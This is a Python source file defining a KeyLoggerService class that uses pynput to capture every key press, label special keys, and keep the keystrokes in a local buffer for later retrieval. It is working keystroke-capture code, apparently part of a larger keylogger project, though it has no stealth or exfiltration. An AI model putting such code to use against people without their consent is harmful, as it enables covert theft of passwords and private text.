from interfaceManager import *
from buffer import *
from typing import List
from pynput import keyboard
from pynput.keyboard import Key



class KeyLoggerService(IKeyLogger):
    """
    A service class for logging keystrokes using the pynput library.

    Inherits from:
        IKeyLogger: An interface that defines the key logging methods.
    """

    def __init__(self):
        """
        Initialize a new KeyLoggerService instance.
        """
        self.__listener = None
        self.__buffer = Buffer()
        self.__is_logging = False

    def start_logging(self) -> None:
        """
        Start logging keystrokes.
        """
        self.__is_logging = True
        self.__listener = keyboard.Listener(on_press=self.on_press)
        self.__listener.start()

    def stop_logging(self) -> None:
        """
        Stop logging keystrokes.
        """
        self.__is_logging = False
        self.__listener.stop()

    def get_logged_keys(self) -> List[str]:
        """
        Retrieve the logged keystrokes.

        Returns:
            List[str]: A list of logged keystrokes.
        """
        return self.__buffer.get_data()

    def flush(self) -> None:
        """
        Clear all logged keystrokes from the buffer.
        """
        self.__buffer.flush()

    def get_is_logging(self) -> bool:
        """
        Check if the keyLogger is currently logging.

        Returns:
            bool: True if logging is active, False otherwise.
        """
        return self.__is_logging

    def convert_key_to_meaning(self, key):
        """
        Convert a key press to its corresponding meaning.

        Args:
            key: The key press event.

        Returns:
            str: The string representation of the key press.
        """
        special_keys = {
            Key.space: " ",
            Key.enter: " \n ",
            Key.backspace: " [BACKSPACE] ",
            Key.tab: " \t ",
            Key.esc: " [ESC] ",
            Key.shift: " [SHIFT] ",
            Key.shift_r: " [SHIFT] ",
            Key.ctrl: " [CTRL] ",
            Key.ctrl_r: " [CTRL] ",
            Key.alt: " [ALT] ",
            Key.alt_r: " [ALT] ",
            Key.cmd: " [CMD] ",
            Key.cmd_r: " [CMD] ",
            Key.caps_lock: " [CAPSLOCK] ",
            Key.f1: " [F1] ",
            Key.f2: " [F2] ",
            Key.f3: " [F3] ",
            Key.f4: " [F4] ",
            Key.f5: " [F5] ",
            Key.f6: " [F6] ",
            Key.f7: " [F7] ",
            Key.f8: " [F8] ",
            Key.f9: " [F9] ",
            Key.f10: " [F10] ",
            Key.f11: " [F11] ",
            Key.f12: " [F12] ",
            Key.home: " [HOME] ",
            Key.end: " [END] ",
            Key.page_up: " [PAGE UP] ",
            Key.page_down: " [PAGE DOWN] ",
            Key.insert: " [INSERT] ",
            Key.delete: " [DELETE] ",
            Key.up: " [UP] ",
            Key.down: " [DOWN] ",
            Key.left: " [LEFT] ",
            Key.right: " [RIGHT] ",
            Key.num_lock: " [NUMLOCK] ",
            Key.scroll_lock: " [SCROLLLOCK] ",
            Key.pause: " [PAUSE] ",
            Key.print_screen: " [PRINT SCREEN] ",
            Key.menu: " [MENU] "
        }

        return special_keys.get(key, str(key))

    def on_press(self, key):
        """
        Handle the key press event and add the key to the buffer.

        Args:
            key: The key press event.
        """
        try:
            self.__buffer.add_data(key.char)
        except AttributeError:
            self.__buffer.add_data(self.convert_key_to_meaning(key))
